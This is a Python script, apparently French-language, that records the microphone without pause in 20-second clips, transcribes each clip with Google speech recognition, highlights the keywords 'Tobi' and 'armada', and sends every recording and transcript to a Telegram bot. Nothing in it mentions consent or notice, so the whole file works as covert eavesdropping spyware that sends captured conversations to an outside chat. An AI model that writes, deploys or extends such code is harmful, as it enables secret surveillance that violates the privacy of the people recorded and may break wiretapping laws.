import os
import wave
import pyaudio
import speech_recognition as sr
import requests
import re


TOKEN = "token bot telegram"
CHAT_ID = "contact chatId Robot"

def record_audio(duration=20):
    """Enregistre l'audio pendant une durée spécifiée en secondes."""
    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
    
    frames = []
    
    for _ in range(int(16000 / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    
    audio_file = "output.wav"
    with wave.open(audio_file, 'wb') as wf:
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(16000)
        wf.writeframes(b''.join(frames))
    
    return audio_file

def transcribe_audio(audio_file):
    """Transcrit le contenu audio en texte."""
    recognizer = sr.Recognizer()
    with sr.AudioFile(audio_file) as source:
        audio_data = recognizer.record(source)
    
    try:
        text = recognizer.recognize_google(audio_data, language='fr-FR')
        return text
    except sr.UnknownValueError:
        return "Je n'ai pas pu comprendre l'audio."
    except sr.RequestError as e:
        return f"Erreur de service; {e}"

def format_transcription(text, keywords):
    """Met en gras les mots-clés dans la transcription."""
    for word in keywords:
        text = re.sub(rf'\b({word})\b', r'**\1**', text, flags=re.IGNORECASE)
    return text

def send_to_telegram(audio_file, transcription):
    """Envoie le fichier audio et la transcription au bot Telegram."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendVoice"
    
    with open(audio_file, 'rb') as f:
        files = {'voice': f}
        data = {
            'chat_id': CHAT_ID,
            'caption': transcription,
            'parse_mode': 'Markdown'  
        }
        response = requests.post(url, data=data, files=files)
        return response.json()

def main():
    keywords = ["Tobi", "armada"]
    
    while True:
        audio_file = record_audio(duration=20)
        transcription = transcribe_audio(audio_file)

        
        if any(keyword.lower() in transcription.lower() for keyword in keywords):
            print("Mot clé détecté, démarrage d'un nouvel enregistrement...")
            send_to_telegram(audio_file, transcription)
        else:
            print("Pas de mot clé détecté. Transcription actuelle : ", transcription)
            formatted_transcription = format_transcription(transcription, keywords)
            send_to_telegram(audio_file, formatted_transcription)
        
        
        os.remove(audio_file)

if __name__ == "__main__":
    main()
